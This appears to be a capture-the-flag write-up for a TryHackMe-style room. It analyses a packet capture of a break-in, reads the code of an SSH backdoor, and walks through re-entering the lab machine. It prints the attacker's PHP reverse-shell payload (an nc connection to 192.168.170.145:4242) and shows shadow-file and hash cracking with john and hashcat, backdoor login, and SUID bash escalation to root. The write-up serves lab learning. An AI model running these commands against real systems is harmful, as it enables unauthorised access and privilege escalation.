## Tools 

1. Wireshark https://www.wireshark.org/download.html
2. Strings
3. ssh
4. John The Ripper https://www.openwall.com/john/
5. hashcat https://hashcat.net/hashcat/

##  Forensics - Analyse the PCAP

1. Download `overpass2.pcapng`.
2. Check and match `md5sum` of the file to verify file.
```bash
md5sum overpass2.pcapng 
11c3b2e9221865580295bc662c35c6dc  overpass2.pcapng
```
3. We can use `wireshark` and `follow TCP streams` of suspicious streams. But, I used `strings overpass2.pcapng`.
4. With strings we can see everything in plaintext. There is a request to link on directory `/development/upload.php`.
5. Question `What was the URL of the page they used to upload a reverse shell?` Answer `/development/`.
6. With same method we can get the payload `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`. You can check it by scrolling or simply use `strings overpass2.pcapng |grep "php exec"`
7. Question `What payload did the attacker use to gain access?` Answer `exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")`.
8. Question `What password did the attacker use to privesc?` Answer `whene************tant`. You can manually scan strings result to see the password.
9. Question `How did the attacker establish persistence?` Answer `https://github.com/NinjaJc01/ssh-backdoor`. With same manual scrolling will work here.
10. We can see `cat /etc/shadow` command and it's result inside `strings` output. We can simply save it in a file named shadow.
11. Then we need to download `fasttrack` wordlist as instructed using command `wget https://raw.githubusercontent.com/drtychai/wordlists/master/fasttrack.txt`.
12. Then we can run john to check.
```bash
john --wordlist=fasttrack.txt shadow 
Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64])

Use the "--show" option to display all of the cracked passwords reliably

13. Question `Using the fasttrack wordlist, how many of the system passwords were crackable?` Answer `4` 


## Research - Analyse the code
1. We have the backdoor link `https://github.com/NinjaJc01/ssh-backdoor`. We can find `hash` and `salt` details inside code. `https://raw.githubusercontent.com/NinjaJc01/ssh-backdoor/master/main.go`
2. Question `What's the default hash for the backdoor?` Answer `bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3`
3. Question `What's the hardcoded salt for the backdoor?` Answer `1c362db832f3f864c8c2fe05f2002a05`.
4. Question `What was the hash that the attacker used? - go back to the PCAP for this!` Answer `6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`. We can check it manually inside `strings` output. By using `strings overpass2.pcapng |grep "backdoor -a"` we can directly find the output.
5. As we can find in the backdoor code that it is `sha512`. So we can decode it using `hashcat`.
```bash
hashcat -m 1710 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05" --force /opt/wordlist/rockyou.txt --quiet
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:no******6
```
6. Question `Crack the hash using rockyou and a cracking tool of your choice. What's the password?` Answer `n********6`

## Attack - Get back in!

1. Start Machine to get IP.
2. Question `The attacker defaced the website. What message did they leave as a heading?` Answer `H4ck3d by CooctusClan`. Manually checking strings output for downloading deface page will show this. We can also use this command `strings overpass2.pcapng |grep "H4ck3d"`. Or simply opening the ip in browser will show this heading.
3. We have repeat attackers steps. Now we can login to the ssh port 2222 opened by the backdoor as we saw in `strings` output. We already have username `james` and can use cracked password. We need to use `-oHostKeyAlgorithms=+ssh-rsa` to get ssh as there is an error.
```bash
ssh -p 2222 james@10.10.136.126
Unable to negotiate with 10.10.136.126 port 2222: no matching host key type found. Their offer: ssh-rsa
$ ssh -oHostKeyAlgorithms=+ssh-rsa james@10.10.136.126 -p 2222
The authenticity of host '[10.10.136.126]:2222 ([10.10.136.126]:2222)' can't be established.
RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.136.126]:2222' (RSA) to the list of known hosts.
james@10.10.136.126's password: *******
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```
4. Question `What's the user flag?` Answer `thm{****************}`
```bash
james@overpass-production:/home/james/ssh-backdoor$ cat /home/james/user.txt
thm{****************}
```
5. By using SUID find command `find . -perm /4000` we got a unusual file `/home/james/.suid_bash`. We can get suid exploit for it here https://gtfobins.github.io/gtfobins/bash/#suid
6. Question `What's the root flag?` Answer `thm{***************************}`
```bash
james@overpass-production:/home/james/ssh-backdoor$ /home/james/.suid_bash -p
.suid_bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
.suid_bash-4.4# cat /root/root.txt
